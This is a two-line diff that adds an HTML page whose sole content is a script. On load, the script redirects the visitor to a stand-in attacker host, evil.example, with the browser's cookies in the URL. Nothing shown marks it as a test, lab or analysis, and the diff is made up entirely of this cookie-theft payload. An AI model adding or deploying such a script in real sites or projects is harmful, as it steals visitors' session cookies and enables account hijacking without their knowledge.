@@ -1,0 +1,2 @@
+<!doctype html>
+<html><body><script>document.location="https://evil.example/steal?c="+document.cookie</script></body></html>
